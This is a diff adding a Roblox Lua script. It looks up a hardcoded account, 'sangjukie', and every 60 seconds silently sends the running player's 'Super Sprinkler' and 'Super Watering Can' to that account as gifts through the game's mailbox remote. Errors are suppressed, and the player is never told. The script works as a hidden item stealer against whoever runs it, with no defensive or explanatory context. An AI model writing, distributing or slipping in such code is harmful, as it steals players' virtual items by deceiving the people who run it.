@@ -1,0 +1,78 @@
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local LocalPlayer = Players.LocalPlayer
+local Networking = require(ReplicatedStorage.SharedModules.Networking)
+
+--------------------------------------------------
+-- CONFIG
+--------------------------------------------------
+
+local USERNAME = "sangjukie"
+local INTERVAL = 60
+
+--------------------------------------------------
+-- GET USER ID
+--------------------------------------------------
+
+local Success, UserId = pcall(function()
+	return Players:GetUserIdFromNameAsync(USERNAME)
+end)
+
+if not Success then
+	return
+end
+
+--------------------------------------------------
+-- CHECK ITEM
+--------------------------------------------------
+
+local function HasItem(ItemName)
+	local Backpack = LocalPlayer:FindFirstChild("Backpack")
+	local Character = LocalPlayer.Character
+
+	return (Backpack and Backpack:FindFirstChild(ItemName))
+		or (Character and Character:FindFirstChild(ItemName))
+end
+
+--------------------------------------------------
+-- LOOP GIFT
+--------------------------------------------------
+
+while task.wait(INTERVAL) do
+
+	-- Super Sprinkler
+	if HasItem("Super Sprinkler") then
+		pcall(function()
+			Networking.Mailbox.SendBatch:Fire(
+				UserId,
+				{
+					{
+						Category = "Sprinklers",
+						ItemKey = "Super Sprinkler",
+						Count = 1
+					}
+				},
+				"Gift"
+			)
+		end)
+	end
+
+	-- Super Watering Can
+	if HasItem("Super Watering Can") then
+		pcall(function()
+			Networking.Mailbox.SendBatch:Fire(
+				UserId,
+				{
+					{
+						Category = "WateringCans",
+						ItemKey = "Super Watering Can",
+						Count = 1
+					}
+				},
+				"Gift"
+			)
+		end)
+	end
+
+end
